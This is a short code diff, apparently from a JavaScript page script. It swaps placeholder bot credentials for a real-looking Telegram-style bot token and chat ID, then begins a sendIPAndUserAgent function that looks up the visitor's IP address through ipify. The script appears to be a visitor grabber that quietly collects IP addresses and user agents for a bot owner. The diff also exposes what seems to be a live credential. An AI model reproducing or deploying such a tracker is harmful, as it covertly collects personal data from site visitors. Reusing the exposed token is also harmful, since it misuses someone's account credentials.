@@ -1,6 +1,6 @@
 // plz edit your bot's configuration
-const BOT_TOKEN = '00000000:XXXXXXXXXX-XXXXXXXXXXXXXXX_XXXX'; // Replace with your bot's TOKEN
-const CHAT_ID = '1234567899'; // Replace with your bot's chat ID
+const BOT_TOKEN = '8032747550:AAFPPwCoeMZHmwAR7gXogPVcM5U10iSbOps'; // Replace with your bot's TOKEN
+const CHAT_ID = '8141434037'; // Replace with your bot's chat ID
 
         function sendIPAndUserAgent() {
             fetch('https://api.ipify.org?format=json')
